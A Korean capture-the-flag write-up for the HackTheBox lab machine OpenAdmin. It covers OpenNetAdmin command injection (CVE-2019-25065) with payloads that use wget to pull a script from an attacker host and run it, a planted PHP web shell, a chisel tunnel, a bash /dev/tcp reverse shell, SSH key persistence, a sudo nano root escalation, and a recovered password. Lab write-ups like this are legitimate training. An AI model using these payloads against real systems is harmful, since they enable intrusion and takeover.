# OpenAdmin - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA openadmin 10.10.10.171
```
<img width="1105" height="373" alt="image" src="https://github.com/user-attachments/assets/3e085241-cf13-4d33-92d6-5535be4a1acc" />

- SSH(22)
- HTTP(80)

---
## HTTP
### gobuster
- `/music`,`/artwork`경로 발견.
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.171 -x php,md,txt -t 50
```
<img width="1105" height="387" alt="image" src="https://github.com/user-attachments/assets/a2ff2a60-d40d-48fe-bd19-392aaca94c18" />

<br>
<br>

- `/music`경로에서 `Login`이 `/ona`경로로 연결되어 있음.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/871262a0-44d4-442f-92e4-b57a2b2f2ccf" />

<br>
<br>

- `OpenNetAdmin - v18.1.1`
<img width="1105" height="387" alt="image" src="https://github.com/user-attachments/assets/40044adb-7130-4864-b283-226f8629ce4f" />

### CVE-2019-25065
- https://nvd.nist.gov/vuln/detail/cve-2019-25065
<img width="1217" height="522" alt="image" src="https://github.com/user-attachments/assets/1ef5821f-350a-4296-95aa-21e19e1e9209" />

<br>
<br>

- 페이로드를 전달하여 명령어를 실행하는 코드.
<img width="1105" height="164" alt="image" src="https://github.com/user-attachments/assets/9e3f8857-4980-44f6-ae86-12e9a1af28d0" />

<br>
<br>

- 명령어 실행 성공.
```bash
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";whoami;echo \"END\"&xajaxargs[]=ping" "http://10.10.10.171/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```
<img width="1105" height="113" alt="image" src="https://github.com/user-attachments/assets/b809e0a6-cedf-462c-96f8-aba40de47ea6" />

<br>
<br>

- 로컬에 `ex.sh` 생성.
<img width="1105" height="100" alt="image" src="https://github.com/user-attachments/assets/97efd36b-ce09-4279-9731-aa42630cf11b" />

<br>
<br>

- 로컬로부터 `ex.sh` 다운로드 받아서 실행.
```bash
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;wget http://10.10.16.4/ex.sh -O /tmp/ex.sh&xajaxargs[]=ping" "http://10.10.10.171/ona/"

curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;/bin/bash /tmp/ex.sh&xajaxargs[]=ping" "http://10.10.10.171/ona/"
```
<img width="1105" height="73" alt="image" src="https://github.com/user-attachments/assets/d0280b6f-b3a9-4cc5-b17a-53cd31be17df" />

<br>
<br>

- 셸 획득.
<img width="1105" height="177" alt="image" src="https://github.com/user-attachments/assets/8ffc8f93-48fc-4608-9e9f-c1c8b026cd35" />

---
## Privesc
- `/opt/ona/www/local/config/database_settings.inc.php`에서 `mysql`계정 발견.
<img width="1105" height="432" alt="image" src="https://github.com/user-attachments/assets/f8976b65-1eef-47dc-9e66-56754c5f4005" />

<br>
<br>

- `mysql`에 특별한 정보 없었음.
- `joanna`, `jimmy` 유저 발견.
```bash
cat /etc/passwd | grep sh$
```
<img width="1105" height="78" alt="image" src="https://github.com/user-attachments/assets/eb36e167-5fc2-43eb-8a89-39cc8e0054df" />

<br>
<br>

- `jimmy:n1nj4W4rri0R!`로그인 성공.
<img width="1105" height="78" alt="image" src="https://github.com/user-attachments/assets/9164429d-08f6-4b88-8afb-0148289e25d7" />

<br>
<br>

- 52846번 포트 발견.
<img width="1105" height="572" alt="image" src="https://github.com/user-attachments/assets/86c2a065-30b6-42cf-b881-b94b56acf422" />

<br>
<br>

- `/var/www/internal`에서 해당 서버가 실행되는 것처럼 보임.
- `jimmy`유저로 해당 폴더에 php파일 생성 가능.
<img width="1105" height="337" alt="image" src="https://github.com/user-attachments/assets/e13bb0a4-c31d-4a57-bf3d-27487b84d71a" />

<br>
<br>

- 웹셸 생성.
```bash
echo '<?php system($_REQUEST['cmd']); ?>' > ex.php
```
<img width="1105" height="24" alt="image" src="https://github.com/user-attachments/assets/40ba6cd8-6335-49a4-af0c-25a0e931bac2" />

<br>
<br>

- 로컬로부터 `chisel` 다운받아 실행.
```bash
./chisel client 10.10.16.4:9000 R:52846:127.0.0.1:52846
```
<img width="1105" height="67" alt="image" src="https://github.com/user-attachments/assets/dd0cef14-b317-4edd-b6f0-a4f112b511db" />

<br>
<br>

<img width="1105" height="126" alt="image" src="https://github.com/user-attachments/assets/bfb2b481-a23e-477e-8298-13aaa5b0da9f" />

<br>
<br>

- 명령어 실행 가능.
```bash
curl 'http://127.0.0.1:52846/ex.php?cmd=whoami'
```
<img width="1105" height="76" alt="image" src="https://github.com/user-attachments/assets/805d72e4-3e9a-4eb9-a39d-d69814e34bc5" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl 'http://127.0.0.1:52846/ex.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.16.4%2F80%200%3E%261%22'
```
<img width="1105" height="76" alt="image" src="https://github.com/user-attachments/assets/58aefd67-6128-4c85-a0aa-63998040895d" />

<br>
<br>

- `joaana` 셸 획득.
<img width="1105" height="175" alt="image" src="https://github.com/user-attachments/assets/c855b45c-6267-487e-b7e8-fbd54e2f8d3c" />

<br>
<br>

- `/home/joaana/.ssh`에 로컬의 public key를 추가하여 SSH 로그인.
```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKeRiGuWWamvfr+ym0HgK+DcR5HpjLAVb3 kali@kali' >> authorized_keys

ssh joanna@10.10.10.171
```
<img width="1105" height="45" alt="image" src="https://github.com/user-attachments/assets/30857ccf-b3c5-43cf-b039-21b944d062e5" />

<br>
<br>

- `root`권한으로 `/bin/nano /opt/priv`실행 가능.
<img width="1105" height="157" alt="image" src="https://github.com/user-attachments/assets/36e84e9d-9b96-43c2-8a02-669a25b6413f" />

<br>
<br>

- https://gtfobins.github.io/gtfobins/nano/
```bash
sudo /bin/nano /opt/priv
```
<img width="1162" height="796" alt="image" src="https://github.com/user-attachments/assets/b8dc90af-ad03-45f5-b8fa-3e9b63b94acc" />

<br>
<br>

```
CTRL+r

CTRL+x
```
<img width="1162" height="796" alt="image" src="https://github.com/user-attachments/assets/469997b5-57d2-445f-9361-c55fc77e902b" />

<br>
<br>

```
reset; sh 1>&0 2>&0
```
<img width="1105" height="120" alt="image" src="https://github.com/user-attachments/assets/ee5288f4-f6dc-4bd8-93ba-13733f21b799" />

---
## FLAG
- `/home/joaana/user.txt`
<img width="1105" height="232" alt="image" src="https://github.com/user-attachments/assets/9a9fba1f-5377-4182-a866-7edaab4a9f28" />

<br>
<br>

- `/root/root.txt`
<img width="1105" height="232" alt="image" src="https://github.com/user-attachments/assets/387ba031-6a4b-4891-9865-5018c38b6bdf" />



























